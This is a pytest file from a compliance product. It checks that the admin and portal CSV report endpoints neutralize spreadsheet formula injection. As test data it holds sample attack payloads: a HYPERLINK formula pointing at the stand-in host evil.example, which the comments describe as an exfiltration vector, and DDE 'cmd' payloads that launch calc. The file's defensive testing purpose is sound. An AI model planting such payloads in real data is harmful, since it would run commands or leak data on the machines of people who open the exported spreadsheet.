# Copyright (c) 2026 Jerly Rojas
# Vaultra — AI Agent Compliance Layer
# https://vaultra.io
# AGPL-3.0 License. Commercial use: legal@vaultra.io

"""
test_csv_export_injection.py — coverage for Task 2.4 (F7/F8): admin/app.py's
and portal/app.py's report_csv() endpoints must neutralize CSV formula
injection. A receipt field that begins with '=', '+', '-', '@', a tab, or a
carriage return is interpreted as a formula (or row/column-smuggling
sequence) by Excel/LibreOffice/Sheets when the exported CSV is opened in a
spreadsheet app — several receipt fields (agent_id, decision, decision_type,
regulation) ultimately arrive via the public /api/receipt ingestion endpoint
and are sanitized only for XSS, not for this.

Both apps got an identical small `csv_safe(value)` helper (duplicated, not
shared — this codebase has no existing pattern for importing between admin/
and portal/) that prefixes any string cell whose value starts with one of
those trigger characters with a single quote, and it's applied to every data
cell written by both report_csv() functions.

Fixture setup follows the established per-module convention (see
test_admin_receipt.py / test_portal_auth.py): DB_PATH is monkeypatched to a
per-test tmp_path file, and each app's own init_db()/init_portal_db() builds
a fresh schema. Receipts are inserted directly via sqlite3 (bypassing the
/api/receipt HTTP ingestion path and its XSS sanitizer) so the exact raw
payload under test is known precisely, and sessions are planted directly via
session_transaction() rather than driving the full login flow, since CSRF
enforcement only applies to mutating (POST/PUT/PATCH/DELETE) requests and
report_csv is a GET.
"""

import importlib
import os
import sqlite3
import sys
import time
import uuid

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# A classic CSV-formula-injection payload. HYPERLINK() is one of the payloads
# that has historically been used to exfiltrate data / trigger outbound
# requests when a victim opens the exported file in Excel/Sheets.
FORMULA_PAYLOAD = "=HYPERLINK(\"http://evil.example/leak\",\"click me\")"

OTHER_TRIGGER_PAYLOADS = ["+cmd|' /C calc'!A1", "-2+3+cmd|' /C calc'!A1", "@SUM(1+1)"]


# ── admin/app.py ────────────────────────────────────────────────────────

@pytest.fixture
def admin_app_module(tmp_path, monkeypatch):
    """Import (or reuse) admin.app with DB_PATH pointed at an isolated,
    per-test SQLite file, and a freshly-initialized schema in it."""
    db_path = tmp_path / "test_admin.db"

    monkeypatch.setenv("DB_PATH", str(db_path))
    monkeypatch.setenv("SECRET_KEY", "test-only-secret-key-do-not-use-in-prod")
    monkeypatch.setenv("ADMIN_PASSWORD", "test-admin-password")
    monkeypatch.setenv("SUPPORT_PASSWORD", "test-support-password")

    if "admin.app" in sys.modules:
        mod = sys.modules["admin.app"]
        monkeypatch.setattr(mod, "DB_PATH", str(db_path))
    else:
        mod = importlib.import_module("admin.app")

    mod.init_db()
    mod.app.config.update(TESTING=True)
    return mod


@pytest.fixture
def admin_client(admin_app_module):
    return admin_app_module.app.test_client()


def _admin_login_session(admin_client, admin_app_module):
    """Plant a valid admin session directly, mirroring what a real /login
    POST would set, without exercising the login form/CSRF flow (out of
    scope here — covered by test_admin_auth.py)."""
    conn = sqlite3.connect(admin_app_module.DB_PATH)
    conn.row_factory = sqlite3.Row
    try:
        user = conn.execute(
            "SELECT * FROM admin_users WHERE username='admin'"
        ).fetchone()
    finally:
        conn.close()
    with admin_client.session_transaction() as sess:
        sess["admin_id"] = user["id"]
        sess["username"] = user["username"]
        sess["role"] = user["role"]
        sess["session_version"] = user["session_version"]
        sess["last_active"] = time.time()
        sess["session_start"] = time.time()


def _make_admin_client_row(admin_app_module, company_name="Test Co"):
    client_id = str(uuid.uuid4())
    conn = sqlite3.connect(admin_app_module.DB_PATH)
    try:
        conn.execute(
            """INSERT INTO clients
               (id, company_name, email, plan, status, api_key_hash,
                api_key_prefix, created_at, monthly_limit, receipt_count,
                month_start, month_count, archived)
               VALUES (?, ?, ?, 'starter', 'active', 'x', 'x', ?, 100000,
                       0, 0, 0, 0)""",
            (client_id, company_name, f"{client_id}@example.com", time.time()),
        )
        conn.commit()
    finally:
        conn.close()
    return client_id


def _insert_admin_receipt(admin_app_module, client_id, agent_id):
    receipt_id = str(uuid.uuid4())
    conn = sqlite3.connect(admin_app_module.DB_PATH)
    try:
        conn.execute(
            """INSERT INTO receipts
               (id, client_id, agent_id, decision, decision_type, input_hash,
                block_number, rfc3161_ts, regulation, status, created_at)
               VALUES (?, ?, ?, 'APPROVE', 'LOAN_APPROVED', 'deadbeef', 1,
                       NULL, 'EU AI Act', 'valid', ?)""",
            (receipt_id, client_id, agent_id, time.time()),
        )
        conn.commit()
    finally:
        conn.close()
    return receipt_id


def test_admin_report_csv_neutralizes_formula_injection(admin_client, admin_app_module):
    client_id = _make_admin_client_row(admin_app_module)
    _insert_admin_receipt(admin_app_module, client_id, agent_id=FORMULA_PAYLOAD)
    _admin_login_session(admin_client, admin_app_module)

    resp = admin_client.get(f"/api/report/{client_id}/csv")
    assert resp.status_code == 200

    body = resp.get_data(as_text=True)
    rows = list(__import__("csv").reader(body.splitlines()))
    data_row = rows[1]
    # Column 1 (index 1) is "Agent ID" per the header row.
    assert data_row[1] == "'" + FORMULA_PAYLOAD
    assert not data_row[1].startswith("=")


@pytest.mark.parametrize("payload", OTHER_TRIGGER_PAYLOADS)
def test_admin_report_csv_neutralizes_other_trigger_chars(admin_client, admin_app_module, payload):
    client_id = _make_admin_client_row(admin_app_module)
    _insert_admin_receipt(admin_app_module, client_id, agent_id=payload)
    _admin_login_session(admin_client, admin_app_module)

    resp = admin_client.get(f"/api/report/{client_id}/csv")
    assert resp.status_code == 200

    body = resp.get_data(as_text=True)
    rows = list(__import__("csv").reader(body.splitlines()))
    data_row = rows[1]
    assert data_row[1] == "'" + payload


def test_admin_csv_safe_helper_passthrough_and_none():
    import admin.app as admin_app
    assert admin_app.csv_safe("normal-agent-id") == "normal-agent-id"
    assert admin_app.csv_safe(None) is None
    assert admin_app.csv_safe(42) == 42
    assert admin_app.csv_safe("=1+1") == "'=1+1"
    assert admin_app.csv_safe("\tsneaky") == "'\tsneaky"
    assert admin_app.csv_safe("\rsneaky") == "'\rsneaky"
    assert admin_app.csv_safe("") == ""


# ── portal/app.py ───────────────────────────────────────────────────────

@pytest.fixture
def portal_app_module(tmp_path, monkeypatch):
    db_path = tmp_path / "test_portal.db"

    monkeypatch.setenv("DB_PATH", str(db_path))
    monkeypatch.setenv("PORTAL_SECRET_KEY", "test-only-portal-secret-do-not-use-in-prod")

    if "portal.app" in sys.modules:
        mod = sys.modules["portal.app"]
        monkeypatch.setattr(mod, "DB_PATH", str(db_path))
    else:
        mod = importlib.import_module("portal.app")

    mod.init_portal_db()

    # `clients` and `receipts` are owned by admin/app.py in production (both
    # apps share one DB file); create minimal versions here so
    # get_current_client() and the report_csv() query can resolve.
    conn = sqlite3.connect(mod.DB_PATH)
    try:
        conn.execute(
            "CREATE TABLE IF NOT EXISTS clients (id TEXT PRIMARY KEY, company_name TEXT)"
        )
        conn.execute(
            """CREATE TABLE IF NOT EXISTS receipts (
                id TEXT PRIMARY KEY, client_id TEXT NOT NULL, agent_id TEXT NOT NULL,
                decision TEXT, decision_type TEXT NOT NULL, input_hash TEXT NOT NULL,
                block_number INTEGER NOT NULL, rfc3161_ts TEXT,
                regulation TEXT NOT NULL DEFAULT 'EU AI Act',
                status TEXT NOT NULL DEFAULT 'valid', created_at REAL NOT NULL
            )"""
        )
        conn.commit()
    finally:
        conn.close()

    mod.app.config.update(TESTING=True)
    return mod


@pytest.fixture
def portal_client(portal_app_module):
    return portal_app_module.app.test_client()


def _make_portal_client_user(portal_app_module, email="user@example.com"):
    import bcrypt
    client_id = str(uuid.uuid4())
    user_id = str(uuid.uuid4())
    pwd_hash = bcrypt.hashpw(b"test-user-password1", bcrypt.gensalt()).decode()
    conn = sqlite3.connect(portal_app_module.DB_PATH)
    try:
        conn.execute(
            "INSERT INTO clients (id, company_name) VALUES (?, 'Test Co')",
            (client_id,),
        )
        conn.execute(
            """INSERT INTO client_users (id, client_id, email, password_hash, created_at, status)
               VALUES (?, ?, ?, ?, ?, 'active')""",
            (user_id, client_id, email, pwd_hash, time.time()),
        )
        conn.commit()
    finally:
        conn.close()
    return user_id, client_id


def _insert_portal_receipt(portal_app_module, client_id, agent_id):
    receipt_id = str(uuid.uuid4())
    conn = sqlite3.connect(portal_app_module.DB_PATH)
    try:
        conn.execute(
            """INSERT INTO receipts
               (id, client_id, agent_id, decision, decision_type, input_hash,
                block_number, rfc3161_ts, regulation, status, created_at)
               VALUES (?, ?, ?, 'APPROVE', 'LOAN_APPROVED', 'deadbeef', 1,
                       NULL, 'EU AI Act', 'valid', ?)""",
            (receipt_id, client_id, agent_id, time.time()),
        )
        conn.commit()
    finally:
        conn.close()
    return receipt_id


def _portal_login_session(portal_client, user_id, client_id, email):
    with portal_client.session_transaction() as sess:
        sess["client_user_id"] = user_id
        sess["client_id"] = client_id
        sess["email"] = email
        sess["last_seen"] = time.time()


def test_portal_report_csv_neutralizes_formula_injection(portal_client, portal_app_module):
    user_id, client_id = _make_portal_client_user(portal_app_module)
    _insert_portal_receipt(portal_app_module, client_id, agent_id=FORMULA_PAYLOAD)
    _portal_login_session(portal_client, user_id, client_id, "user@example.com")

    resp = portal_client.get("/reports/csv")
    assert resp.status_code == 200

    body = resp.get_data(as_text=True)
    rows = list(__import__("csv").reader(body.splitlines()))
    data_row = rows[1]
    # Column 1 (index 1) is "Agent ID" per portal's header row.
    assert data_row[1] == "'" + FORMULA_PAYLOAD
    assert not data_row[1].startswith("=")


@pytest.mark.parametrize("payload", OTHER_TRIGGER_PAYLOADS)
def test_portal_report_csv_neutralizes_other_trigger_chars(portal_client, portal_app_module, payload):
    user_id, client_id = _make_portal_client_user(portal_app_module)
    _insert_portal_receipt(portal_app_module, client_id, agent_id=payload)
    _portal_login_session(portal_client, user_id, client_id, "user@example.com")

    resp = portal_client.get("/reports/csv")
    assert resp.status_code == 200

    body = resp.get_data(as_text=True)
    rows = list(__import__("csv").reader(body.splitlines()))
    data_row = rows[1]
    assert data_row[1] == "'" + payload


def test_portal_csv_safe_helper_passthrough_and_none():
    import portal.app as portal_app
    assert portal_app.csv_safe("normal-agent-id") == "normal-agent-id"
    assert portal_app.csv_safe(None) is None
    assert portal_app.csv_safe(42) == 42
    assert portal_app.csv_safe("=1+1") == "'=1+1"
    assert portal_app.csv_safe("\tsneaky") == "'\tsneaky"
    assert portal_app.csv_safe("\rsneaky") == "'\rsneaky"
    assert portal_app.csv_safe("") == ""
